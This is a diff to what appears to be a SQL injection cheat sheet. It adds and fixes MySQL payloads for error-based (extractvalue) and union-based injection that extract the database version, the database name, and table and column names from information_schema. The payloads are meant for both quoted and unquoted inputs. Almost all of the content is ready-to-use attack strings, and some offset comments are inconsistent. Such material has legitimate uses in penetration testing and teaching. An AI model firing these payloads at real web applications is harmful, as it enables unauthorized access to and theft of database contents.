@@ -120,6 +120,7 @@ Ex 2. SELECT IF(1=1,sleep(10),'a'); <br>
 **Case 1: Error based (Error based SQL Injection is used when UNION based SQL Injection is not possible) <br>**
 Ex 1: Extract DB version <br>
 test' AND extractvalue(rand(),concat(0x3a,(SELECT @@version))) #<br>
+-1 AND extractvalue(rand(),concat(0x3a,(SELECT @@version))) #<br>  /When inserting input is not quoted with single/double quote*/
 
 Ex 2: Extract DB<br>
 test' AND extractvalue(rand(),concat(0x3a,(SELECT database()))) #<br>
@@ -128,5 +129,21 @@ Ex 3: Extract All tables<br>
 test' AND extractvalue(rand(),concat(0x3a,(SELECT table_name from information_schema.tables limit o,1))) #  /*where o=offset, 1= one result, extract result one by one by increamenting offset value. For extracting first row put o=1 */<br>
 
 Ex 4: Extract columns from a table<br>
-test' AND extractvalue(rand(),concat(0x3a,(SELECT table_name from information_schema.tables where table_name='xyz' limit o,1))) #  /*where o=offset, 1= one result, extract result one by one by increamenting offset value. For extracting first row put o=1 */<br>
+test' AND extractvalue(rand(),concat(0x3a,(SELECT column_name from information_schema.columns where table_name='xyz' limit o,1))) #  /*where o=offset, 1= one result, extract result one by one by increamenting offset value. For extracting first row put o=1 */<br>
     
+**Case 2: Union based SQL Injection** /* For number of coloumns & column types see concept above Union section. Here assume, 2 columns present on the main select query*/<br
+Ex 1: Extract DB version <br> 
+test' union all select null,@@version # <br
+1 union all select null,@@version # /When inserting input is not quoted with single/double quote*/<br
+
+Ex 2: Extract DB<br>
+test' union all select null,database() #<br>
+
+Ex 3: Extract All tables<br>
+test' union all select null,(SELECT table_name from information_schema.tables limit 1,1) # /*where o=offset, 1= one result, extract result one by one by increamenting offset value. For extracting first row put o=1 */<br>
+
+Ex 4: Extract columns from a table<br>
+test' union all select null,(SELECT column_name from information_schema.columns where table_name='xyz' limit o,1) # /*where o=offset, 1= one result, extract result one by one by increamenting offset value. For extracting first row put o=1 */<br>
+
+**Case 3: Conditional response based SQL Injection-->Coming soon**
+
